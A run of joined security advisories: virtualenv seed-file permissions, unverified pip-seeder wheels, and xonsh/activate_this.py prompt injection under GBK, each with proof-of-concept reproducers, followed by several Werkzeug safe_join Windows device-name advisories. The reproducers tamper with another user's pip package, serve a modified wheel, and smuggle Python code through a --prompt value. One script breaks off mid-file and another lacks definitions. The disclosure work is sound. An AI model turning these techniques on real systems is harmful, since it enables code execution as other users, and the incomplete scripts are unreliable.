```text #!/usr/bin/env python3 import glob import os import shutil import stat import subprocess import sys from pathlib import Path  sys.stdout.reconfigure(line_buffering=True)  # keep these lines in order with those of the child processes os.umask(0o022)  # for the directories made here as root OWNER, OTHER_USER = 1000, 65534  # root is only needed to switch to these two unprivileged uids VIRTUALENV = ["virtualenv", "--quiet", "--no-periodic-update"]  # default seeder; no network for the update check # read here, as root: /tmp/repro.d need not be readable by the other user ATTACK = Path("/tmp/repro.d/other_user_appends_to_pip.py").read_text()   def run_as_owner(command, home, umask):     environ = {"HOME": str(home), "PATH": os.environ["PATH"]}     subprocess.run(command, user=OWNER, group=OWNER, extra_groups=[], umask=umask, env=environ, cwd=home, check=True)   def mode(path):     return stat.filemode(os.stat(path).st_mode)   work = Path("/tmp/seed-mode-repro") shutil.rmtree(work, ignore_errors=True) work.mkdir() proofs = work / "proofs" proofs.mkdir() proofs.chmod(0o777)  # the other user's line writes the uid it runs as in here  writable_by_others, appended_line_ran_as = {}, {} # the two histories differ only in the umask of the owner's earlier run, the one that fills ~/.cache/virtualenv for case, umask_of_earlier_run in [("CONTROL", 0o022), ("OBSERVED", 0o000)]:     # set up: the owner's home, and with it the cache, is private; the project folder is reachable by path     home = work / f"{case}-home"     home.mkdir(mode=0o700)     os.chown(home, OWNER, OWNER)     projects = work / f"{case}-projects"     projects.mkdir(mode=0o755)     os.chown(projects, OWNER, OWNER)      # owner, some time ago: the first run, with an empty cache, extracts the pip wheel into it     run_as_owner([*VIRTUALENV, str(home / "earlier-env")], home, umask=umask_of_earlier_run)     # owner, today     env = projects / "env"     run_as_owner([*VIRTUALENV, str(env)], home, umask=0o022)      (cached_pip,) = glob.glob(f"{home}/.cache/virtualenv/wheel/*/image/1/CopyPipInstall/pip-*/pip/__init__.py")     (seeded_pip,) = glob.glob(f"{env}/lib/python*/site-packages/pip/__init__.py")     env_files = [path for path in env.rglob("*") if path.is_file() and not path.is_symlink()]     writable_by_others[case] = sum(1 for path in env_files if path.stat().st_mode & stat.S_IWOTH)     print(f"{case} earlier run under umask {umask_of_earlier_run:03o}, env created under umask 022")     print(f"{case}   cache pip/__init__.py  {mode(cached_pip)}")     print(f"{case}   env   pyvenv.cfg       {mode(env / 'pyvenv.cfg')}")     print(f"{case}   env   bin/activate     {mode(env / 'bin' / 'activate')}")     print(f"{case}   env   pip/__init__.py  {mode(seeded_pip)}")     print(f"{case}   env files writable by others: {writable_by_others[case]} of {len(env_files)}")      # attack: another local user appends a line to the owner's seeded pip     proof = proofs / case     subprocess.run(         ["python3", "-", str(env), str(proof)],         input=ATTACK,         text=True,         user=OTHER_USER,         group=OTHER_USER,         extra_groups=[],         env={"PATH": os.environ["PATH"]},         cwd="/",         check=True,     )      # the owner uses the environment     run_as_owner([str(env / "bin" / "pip"), "--version"], home, umask=0o022)     appended_line_ran_as[case] = proof.read_text() if proof.exists() else None     print(f"{case}   other user's line ran as uid: {appended_line_ran_as[case]}")  # check: the same umask 022 today must give the same modes, whatever umask filled the cache earlier control_is_private = writable_by_others["CONTROL"] == 0 and appended_line_ran_as["CONTROL"] is None observed_runs_as_owner = writable_by_others["OBSERVED"] > 0 and appended_line_ran_as["OBSERVED"] == str(OWNER) print("BUG" if control_is_private and observed_runs_as_owner else "OK") ```  **`repro.d/other_user_appends_to_pip.py`**  ```text import glob import sys  environment, proof = sys.argv[1:] (pip_init,) = glob.glob(f"{environment}/lib/python*/site-packages/pip/__init__.py") added_line = f"\nimport os; open({proof!r}, 'w').write(str(os.getuid()))\n"  try:     with open(pip_init, "a") as pip_source:         pip_source.write(added_line)     print(f"other user: appended a line to {pip_init}") except PermissionError as error:     print(f"other user: {error}") ```  ## Impact  Copied seed files can remain readable or writable by other accounts despite the current umask. Exposure requires those accounts to be able to traverse the destination's parent directories. An attacker need not control the private source cache.  Severity: low.  ## Versions tested  The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9.  The fix creates destination files with mode `0644`, or `0755` for executable sources, filtered further by the current umask. It does not grant group or world write access, even with a permissive umask. Source modes are not preserved, including modes more restrictive than this creation policy.  Fix: [PR #3425](https://github.com/pypa/virtualenv/pull/3425).  ## Known mitigation  Create environments beneath a directory accessible only to their owner. Recreate environments whose permissions were inherited from a permissive cache.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  Reported by Anthropic's OSS Scanner as ANT-2026-487MH6OW.

## Summary The pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected. Index candidates on that path do not pass through virtualenv's wheel digest verification. Anthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Wheel selection by the pip seeder when downloads are enabled. ## Attacker-controlled input The pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy. Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy. ## Affected code The relevant 21.14.8 source is in [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py). ## Mechanism With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the configured index. An index wheel with the same package and version as the bundled wheel can be selected without virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the same option. ## Reproduction and evidence The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel; `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting `BUG`. Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is older, while the comparison with the default seeder arose when digest verification was added in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with index lookup disabled. ## Attack sequence ```mermaid sequenceDiagram participant I as Index in pip.conf participant V as virtualenv PipInvoke participant P as pip install participant E as Seeded environment I->>V: serve modified pip wheel V->>V: get_wheel(download=False) V->>P: install with --download permitting index lookup P->>I: select same-version index wheel I->>E: modified pip installed without virtualenv digest check E->>E: later pip invocation runs added code Note over V,E: Default app-data seeder rejects the same digest ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import glob import hashlib import json import os import shutil import subprocess import sys import zipfile from virtualenv.seed.wheels.embed import get_embed_wheel companions = "/tmp/repro.d" work = "/tmp/repro-pip-seeder-download" shutil.rmtree(work, ignore_errors=True) os.makedirs(work) # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network) bundled = get_embed_wheel("pip", f"{sys.version_info.major}.{sys.version_info.minor}") pypi_sha256 = hashlib.sha256(open(bundled.path, "rb").read()).hexdigest() pypi_release = {"filename": bundled.name, "digests": {"sha256": pypi_sha256}} os.makedirs(f"{work}/pypi.org/pypi/pip") with open(f"{work}/pypi.org/pypi/pip/json", "w") as pypi_json: json.dump({"releases": {bundled.version: [pypi_release]}}, pypi_json) # attacker: the mirror serves other bytes under the bundled wheel's own file name marker = f"{work}/MIRROR_CODE_RAN" subprocess.run([sys.executable, f"{companions}/make_mirror.py", str(bundled.path), f"{work}/mirror", marker], check=True) mirror_wheel = f"{work}/mirror/pip/{bundled.name}" mirror_sha256 = hashlib.sha256(open(mirror_wheel, "rb").read()).hexdigest() print(f"{bundled.name}: PyPI publishes sha256 {pypi_sha256}") print(f"{bundled.name}: the mirror serves sha256 {mirror_sha256}") # ## Summary  Caller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence the value passed to virtualenv, and a user must subsequently activate the environment.  ## Affected area  Xonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes can change how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposure through unrelated activators.  ## Attacker-controlled input  The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated activation script.  ## Affected code  The relevant 21.14.8 source is in [xonsh quote()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/xonsh/__init__.py), [UTF-8 template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py).  ## Mechanism  The generator writes `activate.xsh` as UTF-8. Its `quote()` used `repr()`, which leaves printable non-ASCII characters in the file and backslash-escapes an embedded quote. Xonsh's `source` reads the file using `$XONSH_ENCODING`. With GBK or Big5, the UTF-8 bytes of `中` end in `0xad`, which pairs with the following `0x5c` backslash as one decoded character. The backslash no longer escapes the quote. A prompt containing both quote kinds can then close its Python string literal and supply statements that run during activation. With UTF-8 source decoding, the same value stays inside the literal.  ## Reproduction and evidence  The original scanner finding, `ANT-2026-PAUVP7YL`, demonstrated this byte-level failure in `activate_this.py`: a hostile prompt loaded through `exec(open(file).read(), ...)` under GBK created a marker, while UTF-8 and `runpy.run_path` controls did not. The xonsh path in this advisory was identified in the subsequent maintainer-provided review. [PR #3432](https://github.com/pypa/virtualenv/pull/3432) shows the xonsh source-decoding chain and changes `quote()` to `ascii()`, which writes non-ASCII characters as escapes. Its regression test encodes the generated literal as ASCII, decodes it as GBK, and checks that `ast.literal_eval` returns the original prompt.  The attack needs control of the prompt or destination value, an affected xonsh source encoding, and later sourcing of the generated file. The original `activate_this.py` reproducer does not itself prove xonsh execution; that result is attributed to the separate review. Existing `activate.xsh` files must be regenerated after the fix.  ## Attack sequence  ```mermaid sequenceDiagram     participant A as Prompt supplier     participant V as virtualenv quote()     participant F as activate.xsh bytes     participant X as xonsh source     A->>V: 中 plus escaped quote and statements     V->>F: repr writes UTF-8 中 followed by backslash     alt XONSH_ENCODING is UTF-8         F->>X: backslash remains an escape         X-->>A: prompt remains data     else XONSH_ENCODING is GBK or Big5         F->>X: decoder consumes backslash as trail byte         X->>X: quote closes and statements run     end     Note over V,X: ascii() emits only ASCII bytes and preserves the literal ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-PAUVP7YL`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  ```text #!/usr/bin/env python3 import os import subprocess import sys from pathlib import Path from shutil import rmtree  work = Path("/tmp/activate-this-gbk") rmtree(work, ignore_errors=True) work.mkdir() env_dir = work / "venv" marker = work / "MARKER"  # set up: a zh_CN.GBK locale, which the image does not ship subprocess.run([sys.executable, "/tmp/repro.d/install_gbk_locale.py", work / "locales"], check=True) utf8_session = {"PATH": os.environ["PATH"], "LANG": "C.UTF-8"} gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": str(work / "locales")}  # attacker: text that a tool relays as --prompt # the payload's " makes repr() delimit with ' and write the prompt's own ' as \' # 中 is e4 b8 ad in UTF-8; GBK reads e4 b8 as one character and ad 5c, ad plus that backslash, as the next payload = f'__import__("os").system("touch {marker}")' hostile_prompt = "中" + "';" + payload + "#"  # user: creates the environment with the virtualenv command subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--prompt", hostile_prompt, env_dir], check=True) activate_this = (env_dir / "bin" / "activate_this.py").read_bytes() prompt_line = next(line for line in activate_this.splitlines() if line.startswith(b'os.environ["VIRTUAL_ENV_PROMPT"]')) print(f"activate_this.py read as UTF-8: {prompt_line.decode('utf-8')}") print(f"activate_this.py read as GBK:   {prompt_line.decode('gbk')}") assert not marker.exists(), "payload ran at creation time"  # trigger: the same program activates the environment, first in a UTF-8 session, then in a GBK one activate = [sys.executable, "/tmp/repro.d/activate_with_exec_open.py", env_dir] control = subprocess.run(activate, env=utf8_session, stdout=subprocess.PIPE, encoding="utf-8", check=True) ran_in_utf8_session = marker.exists() print(f"CONTROL  UTF-8 session: {control.stdout.strip()}; {marker} exists: {ran_in_utf8_session}")  observed = subprocess.run(activate, env=gbk_session, stdout=subprocess.PIPE, encoding="gbk", check=True) ran_in_gbk_session = marker.exists() print(f"OBSERVED GBK session:   {observed.stdout.strip()}; {marker} exists: {ran_in_gbk_session}")  # check: the prompt is data and must not run in either session print("BUG" if ran_in_gbk_session and not ran_in_utf8_session else "OK") ```  **`repro.d/activate_with_exec_open.py`**  ```text #!/usr/bin/env python3 # usage: activate_with_exec_open.py ENV_DIR # A program that activates a virtualenv the way activate_this.py's docstring said to until virtualenv 20.26.2. import locale import os import sys  this_file = os.path.join(sys.argv[1], "bin", "activate_this.py") exec(open(this_file).read(), {"__file__": this_file})  print(f"open() decodes as {locale.getpreferredencoding(False)}, VIRTUAL_ENV_PROMPT is {os.environ['VIRTUAL_ENV_PROMPT']}") ```  **`repro.d/install_gbk_locale.py`**  ```text #!/usr/bin/env python3 # usage: install_gbk_locale.py LOCPATH # Does what `locale-gen zh_CN.GBK` would; localedef fills in defaults, warns and exits 1, so check the result below source = "/tmp/repro.d/zh_CN_minimal.locale" subprocess.run(["localedef", "-c", "-f", f"{locpath}/GBK.charmap", "-i", source, f"{locpath}/zh_CN.GBK"], capture_output=True)  gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": locpath} codeset = subprocess.run(["locale", "charmap"], env=gbk_session, capture_output=True, text=True, check=True) if codeset.stdout.strip() != "GBK" or codeset.stderr:     sys.exit(f"zh_CN.GBK locale not usable: {codeset}") ```  **`repro.d/zh_CN_minimal.locale`**  ```text comment_char % escape_char / % Stand-in for glibc's locales/zh_CN: ASCII character classes only. What matters is the codeset name, GBK, which % comes from the charmap given to localedef with -f. LC_CTYPE upper <U0041>..<U005A> lower <U0061>..<U007A> digit <U0030>..<U0039> space <U0009>..<U000D>;<U0020> cntrl <U0000>..<U001F>;<U007F> punct <U0021>..<U002F>;<U003A>..<U0040>;<U005B>..<U0060>;<U007B>..<U007E> xdigit <U0030>..<U0039>;<U0041>..<U0046>;<U0061>..<U0066> blank <U0009>;<U0020> END LC_CTYPE LC_COLLATE order_start forward UNDEFINED order_end END LC_COLLATE ```  ## Impact  An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The attack requires control of argument data and subsequent user activation; it does not require replacing an executable or controlling app-data contents.  ## Versions tested  The supplied follow-up review marks command execution as independently confirmed by its author. The implementation review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.  ## Known mitigation  Use trusted prompt and destination values. Use UTF-8 source decoding in xonsh on older releases. Recreate environments with virtualenv 21.14.9 or later.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  The original report was supplied by Anthropic's OSS Scanner as ANT-2026-PAUVP7YL. The subsequent maintainer-provided review identified the remaining activation path.  ## Additional fix branch  [PR #3411](https://github.com/pypa/virtualenv/pull/3411) also uses ASCII-only literals for paths and prompts, alongside its activation-state changes. Both branches must retain this quoting rule when integrated.

Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

Werkzeug's `safe_join` function allows Windows device names as filenames if when preceded by other path segments.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact that `safe_join` accepts paths with multiple segments, such as `example/NUL`.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

Werkzeug is a comprehensive WSGI web application library. Versions 3.1.5 and below, the safe_join function allows Windows device names as filenames if preceded by other path segments. This was previously reported as GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact that safe_join accepts paths with multiple segments, such as example/NUL. The function send_from_directory uses safe_join to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely. This issue has been fixed in version 3.1.6.

Werkzeug's `safe_join` function allows Windows device names as filenames when they have an empty ADS marker on NTFS.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact Windows allows special device names with an empty ADS marker, such as `NUL:`.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory.
